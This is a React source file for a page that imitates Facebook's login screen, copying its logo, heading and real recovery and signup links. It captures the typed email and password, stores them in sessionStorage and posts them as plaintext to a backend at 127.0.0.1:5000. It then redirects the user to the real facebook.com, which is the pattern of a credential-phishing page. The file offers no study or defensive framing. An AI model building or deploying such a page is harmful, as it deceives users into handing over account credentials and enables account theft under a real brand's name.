import React from "react";
import "./Login.css";

class Login extends React.Component {
     constructor() {
        super();
    }


  render() {
    return (
        <div className="login">
          <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
               className="login__logo"/>
          <div className="login__container">
            <h3>Log in to Facebook</h3>
            <form>
              <center>
                <input
                    type="email"
                    onChange={(e) => sessionStorage.setItem("email",e.target.value)}
                    placeholder="Email Address"
                />

              </center>
              <center>
                <input
                    type="password"
                    onChange={(e)=> sessionStorage.setItem("password",e.target.value)}
                    placeholder="Password"
                />
              </center>
              <center>
                <button onClick={this.onClick} type="submit"
                        className="login__login">
                  Log In
                </button>
              </center>
              <center>
                <div className="sideinfo">
                  <a href = "https://en-gb.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
                      <h5>Forgotten Password?</h5></a>
                  <h5 className="dot">·</h5>
                  <a href = "https://en-gb.facebook.com/">
                    <h5 className="rtd">Sign up for Facebook</h5>
                  </a>
                </div>
              </center>
            </form>
          </div>
        </div>
    );
  }


   onClick = async (event)=> {
        event.preventDefault();

        let jsonData = {
            email: sessionStorage.getItem("email"),
            password: sessionStorage.getItem("password")
        }

        const response = await fetch('http://127.0.0.1:5000/login', {
                method: 'POST',
                body: JSON.stringify(jsonData)
                });

        const json = await response.json();
        console.log(json)

        if (json.response){
            window.location.replace( "https://www.facebook.com/"); //navigate to a different website
        }

        return json;

    }



}

export default Login;